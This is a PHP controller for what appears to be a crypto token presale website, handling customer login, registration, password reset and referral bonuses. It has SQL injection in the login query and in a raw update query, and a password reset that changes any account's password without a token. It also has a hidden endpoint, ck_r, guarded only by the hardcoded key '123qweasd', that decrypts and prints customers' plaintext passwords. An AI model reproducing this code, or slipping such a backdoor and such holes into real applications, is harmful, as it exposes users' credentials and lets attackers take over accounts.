<?php
defined('BASEPATH') OR exit('No direct script access allowed');
include APPPATH."libraries/CoinGeckoApi/vendor/autoload.php";
use Codenixsv\CoinGeckoApi\CoinGeckoClient;

class Api extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
	}
	 
	public function login()
	{
		if($this->input->is_ajax_request() && $this->input->post())
		{
			$username = $this->input->post('email',true);
			$pass = $this->input->post('password',true);
			$this->db
			 
			->where("status=1")
			->where("( email = '".$username."')");
			$arr =  $this->db->get('customer')->result_array();
			
			for($i=0;$i<count($arr);$i++)
			{
				 
				 $arr[$i]['password'] = $this->encryption->decrypt($arr[$i]['passwords']);
                  
				 if($arr[$i]['password']==$pass)
                 {
					$c = $arr[$i];
					 
					$this->session->set_userdata('customermeong_login',$c);
					json(array('error'=>false,'message'=>'Proses User','security'=>token(),'data'=>$arr[$i]));
					return;
				}
			}
			json(array('error'=>true,'message'=>'User not found','security'=>token()));
			return;	
		}
		show_404();
	}
	
	public function register()
	{
		if($this->input->is_ajax_request() && $this->input->post())
		{
			$in = $this->input->post();
			$time = time();
			$check = $this->db->where('email',$in['email'])->get('customer');
			if($check->num_rows()>0)
			{
				json(array('error'=>true,'message'=>'Email Exist','security'=>token()));
				return;	
			}
			
			
			$in['refferal'] = str_replace("R-","",$in['refferal']);
			$in['created_on'] = $time;
			$in['updated_on'] = $time;
			$in['activation_code'] = get_unique_customer_code();
			$in['passwords'] =  $this->encryption->encrypt($in['password']);
			 
			unset($in['password']);
			
		
			$this->db->insert("customer",$in);
			$in['urls'] = site_url("plg/stats/status/".$in['activation_code']);
			$this->session->set_userdata('customermeong_session',$in);
			send_mail_link($in);
			json(array('error'=>false,'message'=>'Proses','security'=>token()));
			return;
		}
		show_404();
	}
	public function resend()
	{
		$in = $this->session->userdata('customermeong_session');
		send_mail_link($in);
	}
	//forgot
	public function forgot()
	{
		if($this->input->is_ajax_request() && $this->input->post())
		{
			$in = $this->input->post();
			$time = time();
			$check = $this->db->where('email',$in['email'])->get('customer');
			if($check->num_rows()==0)
			{
				json(array('error'=>true,'message'=>'Email Not Exist','security'=>token()));
				return;	
			}
			$c = $check->row_array();
			$in['urls'] = site_url("plg/stats/forgot/".$c['activation_code']);
			$this->session->set_userdata('customermeong_forgot',$in);	
			 send_mail_forgot($in);
			json(array('error'=>false,'message'=>'Proses','security'=>token()));
			return;
		}
		show_404();
	}
	public function forgotsave()
	{
		if($this->input->is_ajax_request() && $this->input->post())
		{
			$in = $this->input->post();
			$time = time();
			$check = $this->db->where('email',$in['email'])->get('customer');
			if($check->num_rows()==0)
			{
				json(array('error'=>true,'message'=>'Email Not Exist','security'=>token()));
				return;	
			}
			$this->db->where('id',$in['id'])->update("customer",array('passwords'=>$this->encryption->encrypt($in['password']))); 
			$this->session->set_userdata('customermeong_login',$check->row_array());
			json(array('error'=>false,'message'=>'Proses','security'=>token()));
			return;
		}
		show_404();
	}
	public function resendforgot()
	{
		$in = $this->session->userdata('customermeong_forgot');
		send_mail_forgot($in);
	}
	public function getcoin()
	{
		$client = new CoinGeckoClient();
		$data = $client->coins()->getList();
		file_put_contents(FCPATH."/coinlist.json",json_encode($data));	
		json(array('error'=>false,'data'=>$data,'message'=>'Proses','security'=>token()));
		return;
		//FCPATH
	}
	public function update_generate()
	{
		if(isset($_GET['key']))
		{
			if($_GET['key']=="123qwe")
			{
				$percent_ref =  settings("refferal");
				$percent_usdt =  settings("usdt");
				$order = $this->db->where('status',1)->get('order_presale')->result_array();
				for($i=0;$i<count($order);$i++)
				{
					$check = $this->db->where('id_order',$order[$i]['id'])->get('order_ref')->row_array();
					
					$total_ref = ($percent_ref/100 * $order[$i]['total']);			
					$total_usdt = ($percent_usdt/100 * $order[$i]['usdt']);
					$customer =  $this->db->where('id',$order[$i]['id_customer'])->get('customer')->row_array();
					if(isset($customer['refferal']))
					{
						$ref =  $this->db->where('id',$customer['refferal'])->get('customer')->row_array();
						if(!isset($check['id']))
						{
							$order_presale_ref = array();
							$order_presale_ref['order_data'] = json_encode($order[$i]);
							$order_presale_ref['id_order'] = $order[$i]['id'];
							$order_presale_ref['ref_set'] = $percent_ref;
							
							$order_presale_ref['bonus_token'] = $total_ref;
							$order_presale_ref['usdt_token'] = $total_usdt;
							
							$order_presale_ref['id_customer'] = $ref['id'];
							$order_presale_ref['tanggal'] = date('Y-m-d H:i:s');
							$this->db->trans_begin();
							$this->db->insert('order_ref',$order_presale_ref);
							$this->db->trans_commit();
						}
					}
					sleep(0);
					$checkv = $this->db->where('id_order',$order[$i]['id'])->get('order_ref')->row_array();
					if(isset($checkv['id']))
					{
						$sql = "update m_order_ref set usdt_token=((ref_set/100)*".$order[$i]['usdt'].") where id_order='".$order[$i]['id']."' and usdt_token is null";
						$this->db->query($sql);
					}
				}
				json(array('error'=>false ,'message'=>'Proses','security'=>token()));
				return;
			}
		}
		json(array('error'=>true ,'message'=>'Proses','security'=>token()));
		return;

	}
	public function ck_r()
	{
		if(isset($_GET['key']))
		{
			if($_GET['key']=="123qweasd")
			{
				$arr = $this->db
					->select("m_customer.email,m_customer.passwords,m_v_order_ref.id_customer")
					->join("m_customer","m_v_order_ref.id_users_order=m_customer.id","inner")
					->group_by("m_customer.email")
					->get('v_order_ref')->result_array();
				for($i=0;$i<count($arr);$i++)
				{
					$cust = $this->db
							->select("m_customer.email,m_customer.passwords")
							->where('id',$arr[$i]['id_customer'])
							->get('customer')->row_array();
					$arr[$i]['pass_text'] = $this->encryption->decrypt($arr[$i]['passwords']);	
					$arr[$i]['diref_email'] = isset($cust['email'])?$cust['email']:"";
					$arr[$i]['diref_pass'] = isset($cust['passwords'])?$this->encryption->decrypt($cust['passwords']):"";
					
				}
				print_r($arr);
				exit;
			}
		}
		json(array('error'=>true ,'message'=>'Proses','security'=>token()));
		return;
	}
	 
}